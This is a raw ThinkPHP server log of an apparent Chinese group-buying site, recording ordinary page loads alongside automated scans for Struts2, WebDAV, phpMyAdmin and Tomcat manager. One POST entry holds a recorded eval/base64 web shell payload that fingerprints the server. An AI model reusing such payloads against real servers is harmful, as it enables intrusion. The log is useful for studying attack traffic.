[ info ] 119.29.24.237/struts2-032/index.actionwikilib.d/PmWiki.ChangeLog [运行时间：0.017484s][吞吐率：57.20req/s] [内存消耗：975.12kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionwikilib.d',
    2 => 'PmWiki.ChangeLog',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionwikilib_d/PmWiki_ChangeLog' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:54+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.action4e5e5d7364f443e28fbf0d3ae744a59a
[ info ] 119.29.24.237/struts2-032/index.action4e5e5d7364f443e28fbf0d3ae744a59a [运行时间：0.023649s][吞吐率：42.28req/s] [内存消耗：975.23kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.action4e5e5d7364f443e28fbf0d3ae744a59a',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_action4e5e5d7364f443e28fbf0d3ae744a59a' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:54+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionjenkins/
[ info ] 119.29.24.237/struts2-032/index.actionjenkins/ [运行时间：0.018455s][吞吐率：54.19req/s] [内存消耗：975.02kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionjenkins',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionjenkins/' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:55+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.action
[ info ] 119.29.24.237/struts2-032/index.action [运行时间：0.017853s][吞吐率：56.01req/s] [内存消耗：974.87kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.action',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_action' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T14:02:50+08:00 ] 10.135.33.45 101.104.46.39 OPTIONS /IPC$
[ info ] 119.29.24.237/IPC$ [运行时间：0.023297s][吞吐率：42.92req/s] [内存消耗：972.31kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'IPC$',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '119.29.24.237',
  'translate' => 'f',
  'user-agent' => 'Microsoft-WebDAV-MiniRedir/6.1.7601',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/IPC$' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T14:15:52+08:00 ] 10.135.33.45 101.104.45.109 OPTIONS /IPC$
[ info ] 119.29.24.237/IPC$ [运行时间：0.020990s][吞吐率：47.64req/s] [内存消耗：972.31kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'IPC$',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '119.29.24.237',
  'translate' => 'f',
  'user-agent' => 'Microsoft-WebDAV-MiniRedir/6.1.7601',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/IPC$' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T14:21:40+08:00 ] 10.135.33.45 101.104.52.69 OPTIONS /IPC$
[ info ] 119.29.24.237/IPC$ [运行时间：0.019676s][吞吐率：50.82req/s] [内存消耗：972.31kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'IPC$',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '119.29.24.237',
  'translate' => 'f',
  'user-agent' => 'Microsoft-WebDAV-MiniRedir/6.1.7601',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/IPC$' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T15:59:32+08:00 ] 10.135.33.45 183.57.53.197 GET /struts2-032/index.action4e5e5d7364f443e28fbf0d3ae744a59a
[ info ] 119.29.24.237/struts2-032/index.action4e5e5d7364f443e28fbf0d3ae744a59a [运行时间：0.019490s][吞吐率：51.31req/s] [内存消耗：974.52kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.action4e5e5d7364f443e28fbf0d3ae744a59a',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_action4e5e5d7364f443e28fbf0d3ae744a59a' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T17:01:29+08:00 ] 10.135.33.45 123.249.75.155 GET /
[ info ] 119.29.24.237/ [运行时间：0.241159s][吞吐率：4.15req/s] [内存消耗：2,368.34kb] [文件加载：59]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'cache-control' => 'no-cache',
  'host' => '119.29.24.237',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'content-type' => 'application/x-www-form-urlencoded',
  'accept-language' => 'zh-cn',
  'referer' => 'http://119.29.24.237:80/',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\119.29.24.237\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\119.29.24.237\public/../application/index\view\index\index.html [ array (
  0 => 'citys',
  1 => 'city',
  2 => 'cats',
  3 => 'controller',
  4 => 'user',
  5 => 'title',
  6 => 'bigImages',
  7 => 'smallImages',
  8 => 'foodCates',
  9 => 'dealFoods',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000971s ] mysql:dbname=o2o;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_city` [ RunTime:0.000960s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_city` WHERE  `parent_id` <> 0  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc [ RunTime:0.000585s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_city` WHERE  `uname` = 'bozhou' LIMIT 1 [ RunTime:0.000481s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_category` [ RunTime:0.000837s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` = 0  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 5 [ RunTime:0.000484s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` IN (1,6,9,8,2)  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc [ RunTime:0.000574s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_featured` [ RunTime:0.000856s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 0 LIMIT 1 [ RunTime:0.000423s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 0 ORDER BY `id`  desc LIMIT 0,10 [ RunTime:0.000402s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 1 LIMIT 1 [ RunTime:0.000318s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 1 ORDER BY `id`  desc LIMIT 0,10 [ RunTime:0.000365s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_deal` [ RunTime:0.000865s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_deal` WHERE  `end_time` > 1507280489  AND `category_id` = 1  AND `city_id` = 12  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 10 [ RunTime:0.186505s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` = 1  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 4 [ RunTime:0.000558s ]
---------------------------------------------------------------
[ 2017-10-06T17:22:43+08:00 ] 10.135.33.45 183.57.53.222 GET /IPC$
[ info ] 119.29.24.237/IPC$ [运行时间：0.019208s][吞吐率：52.06req/s] [内存消耗：973.81kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'IPC$',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/IPC$' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T17:42:38+08:00 ] 10.135.33.45 164.132.91.1 GET /
[ info ] 119.29.24.237/ [运行时间：0.548779s][吞吐率：1.82req/s] [内存消耗：2,367.35kb] [文件加载：59]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'user-agent' => 'Iceweasel/14.0',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\119.29.24.237\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\119.29.24.237\public/../application/index\view\index\index.html [ array (
  0 => 'citys',
  1 => 'city',
  2 => 'cats',
  3 => 'controller',
  4 => 'user',
  5 => 'title',
  6 => 'bigImages',
  7 => 'smallImages',
  8 => 'foodCates',
  9 => 'dealFoods',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.001363s ] mysql:dbname=o2o;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_city` [ RunTime:0.253255s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_city` WHERE  `parent_id` <> 0  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc [ RunTime:0.000763s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_city` WHERE  `uname` = 'bozhou' LIMIT 1 [ RunTime:0.000617s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_category` [ RunTime:0.001083s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` = 0  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 5 [ RunTime:0.000635s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` IN (1,6,9,8,2)  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc [ RunTime:0.000705s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_featured` [ RunTime:0.218469s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 0 LIMIT 1 [ RunTime:0.001850s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 0 ORDER BY `id`  desc LIMIT 0,10 [ RunTime:0.000641s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 1 LIMIT 1 [ RunTime:0.000498s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 1 ORDER BY `id`  desc LIMIT 0,10 [ RunTime:0.000551s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_deal` [ RunTime:0.001194s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_deal` WHERE  `end_time` > 1507282958  AND `category_id` = 1  AND `city_id` = 12  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 10 [ RunTime:0.000811s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` = 1  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 4 [ RunTime:0.000633s ]
---------------------------------------------------------------
[ 2017-10-06T18:30:44+08:00 ] 10.135.33.45 89.248.172.16 GET /
[ info ] 119.29.24.237/ [运行时间：0.117028s][吞吐率：8.54req/s] [内存消耗：2,368.08kb] [文件加载：59]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-encoding' => 'identity',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\119.29.24.237\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\119.29.24.237\public/../application/index\view\index\index.html [ array (
  0 => 'citys',
  1 => 'city',
  2 => 'cats',
  3 => 'controller',
  4 => 'user',
  5 => 'title',
  6 => 'bigImages',
  7 => 'smallImages',
  8 => 'foodCates',
  9 => 'dealFoods',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000976s ] mysql:dbname=o2o;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_city` [ RunTime:0.001115s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_city` WHERE  `parent_id` <> 0  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc [ RunTime:0.000582s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_city` WHERE  `uname` = 'bozhou' LIMIT 1 [ RunTime:0.057938s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_category` [ RunTime:0.001477s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` = 0  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 5 [ RunTime:0.000660s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` IN (1,6,9,8,2)  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc [ RunTime:0.000677s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_featured` [ RunTime:0.001065s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 0 LIMIT 1 [ RunTime:0.000386s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 0 ORDER BY `id`  desc LIMIT 0,10 [ RunTime:0.000410s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 1 LIMIT 1 [ RunTime:0.000343s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 1 ORDER BY `id`  desc LIMIT 0,10 [ RunTime:0.000479s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_deal` [ RunTime:0.000925s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_deal` WHERE  `end_time` > 1507285844  AND `category_id` = 1  AND `city_id` = 12  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 10 [ RunTime:0.000657s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` = 1  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 4 [ RunTime:0.000481s ]
---------------------------------------------------------------
[ 2017-10-06T18:30:52+08:00 ] 10.135.33.45 89.248.172.16 GET /sitemap.xml
[ info ] 119.29.24.237/sitemap.xml [运行时间：0.018505s][吞吐率：54.04req/s] [内存消耗：972.55kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'sitemap.xml',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'identity',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/sitemap_xml' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T19:52:17+08:00 ] 10.135.33.45 101.104.51.27 OPTIONS /ipc$
[ info ] 119.29.24.237/ipc$ [运行时间：0.020646s][吞吐率：48.44req/s] [内存消耗：972.31kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ipc$',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '119.29.24.237',
  'translate' => 'f',
  'user-agent' => 'Microsoft-WebDAV-MiniRedir/6.1.7601',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/ipc$' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T20:11:43+08:00 ] 10.135.33.45 180.97.238.87 GET /phpmyadmin
[ info ] 119.29.24.237/phpmyadmin [运行时间：0.027701s][吞吐率：36.10req/s] [内存消耗：973.76kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'phpmyadmin',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => '119.29.24.237',
  'content-type' => 'application/x-www-form-urlencoded',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'accept-language' => 'zh-cn',
  'referer' => 'http://119.29.24.237/phpmyadmin',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
  '/phpmyadmin' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T20:11:43+08:00 ] 10.135.33.45 180.97.238.87 GET /phpMyAdmin
[ info ] 119.29.24.237/phpMyAdmin [运行时间：0.018008s][吞吐率：55.53req/s] [内存消耗：973.76kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'phpMyAdmin',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => '119.29.24.237',
  'content-type' => 'application/x-www-form-urlencoded',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'accept-language' => 'zh-cn',
  'referer' => 'http://119.29.24.237/phpMyAdmin',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
  '/phpMyAdmin' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T20:11:43+08:00 ] 10.135.33.45 180.97.238.87 POST /aaaa.php
[ info ] 119.29.24.237/aaaa.php [运行时间：0.019992s][吞吐率：50.02req/s] [内存消耗：976.07kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'aaaa.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => '119.29.24.237',
  'content-length' => '691',
  'content-type' => 'application/x-www-form-urlencoded',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'accept-language' => 'zh-cn',
  'referer' => 'http://119.29.24.237/aaaa.php',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
  '/aaaa_php' => '',
  'aaaa' => '@eval(base64_decode($_POST[z0]));',
  'z0' => 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0Ii4iLXwiO2lmKHN1YnN0cigkRCwwLDEpIT0iLyIpe2ZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO30kUi49Ilx0IjskdT0oZnVuY3Rpb25fZXhpc3RzKCdwb3NpeF9nZXRlZ2lkJykpP0Bwb3NpeF9nZXRwd3VpZChAcG9zaXhfZ2V0ZXVpZCgpKTonJzskdXNyPSgkdSk/JHVbJ25hbWUnXTpAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Iih7JHVzcn0pIjtwcmludCAkUjs7ZWNobygifDwtIik7ZGllKCk7',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T21:38:24+08:00 ] 10.135.33.45 101.104.39.32 OPTIONS /ipc$
[ info ] 119.29.24.237/ipc$ [运行时间：0.019880s][吞吐率：50.30req/s] [内存消耗：972.31kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ipc$',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '119.29.24.237',
  'translate' => 'f',
  'user-agent' => 'Microsoft-WebDAV-MiniRedir/6.1.7601',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/ipc$' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T21:45:41+08:00 ] 10.135.33.45 101.104.35.129 OPTIONS /ipc$
[ info ] 119.29.24.237/ipc$ [运行时间：0.018859s][吞吐率：53.02req/s] [内存消耗：972.31kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ipc$',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '119.29.24.237',
  'translate' => 'f',
  'user-agent' => 'Microsoft-WebDAV-MiniRedir/6.1.7601',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/ipc$' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T22:21:01+08:00 ] 10.135.33.45 123.57.0.236 GET /manager/html
[ info ] 119.29.24.237:80/manager/html [运行时间：0.028733s][吞吐率：34.80req/s] [内存消耗：973.05kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => '119.29.24.237:80',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)',
  'accept' => 'text/html, application/xhtml+xml, */*',
)
[ info ] [ PARAM ] array (
  '/manager/html' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T23:37:38+08:00 ] 10.135.33.45 101.104.39.169 OPTIONS /ipc$
[ info ] 119.29.24.237/ipc$ [运行时间：0.019872s][吞吐率：50.32req/s] [内存消耗：972.31kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ipc$',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '119.29.24.237',
  'translate' => 'f',
  'user-agent' => 'Microsoft-WebDAV-MiniRedir/6.1.7601',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/ipc$' => '',
)
[ info ] [ LOG ] INIT File
